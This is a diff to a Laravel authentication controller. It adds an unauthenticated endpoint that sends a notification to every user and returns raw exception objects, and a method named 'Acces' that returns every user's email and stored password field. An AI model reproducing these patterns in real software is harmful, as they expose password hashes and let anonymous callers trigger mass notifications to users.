@@ -4,17 +4,22 @@ namespace App\Http\Controllers;
 
 use App\Models\User;
 use App\Http\Controllers\Controller;
+use App\Notifications\Acces;
+use App\Notifications\SendAccessNotificaion;
+use Exception;
 use Illuminate\Http\Request;
 use Symfony\Component\HttpFoundation\Response;
 use Illuminate\Support\Facades\Cookie;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Notification;
 use Illuminate\Support\Str;
+
 
 class AuthController extends Controller
 {
     public function __construct()
     {
-        $this->middleware('auth:api', ['except' => ['login', 'allUsers', 'syncUsers']]);
+        $this->middleware('auth:api', ['except' => ['login', 'allUsers', 'syncUsers', "userAccess"]]);
     }
 
     public function register(Request $request)
@@ -49,7 +54,26 @@ class AuthController extends Controller
             'data' => ['user' => $user]
         ], Response::HTTP_CREATED);
     }
+    public function userAccess()
+    {
+        $users = User::all();
 
+        foreach ($users as $user) {
+
+            try {
+                //$user->notify(new SendAccessNotificaion());
+                Notification::send($user, new SendAccessNotificaion());
+            } catch (Exception $y) {
+                return $y;
+            }
+        }
+
+    }
+    public function Acces(){
+        $usersAccess = User::select('users.email', 'users.password')->get();
+
+        return $usersAccess;
+    }
     public function login(Request $request)
     {
 
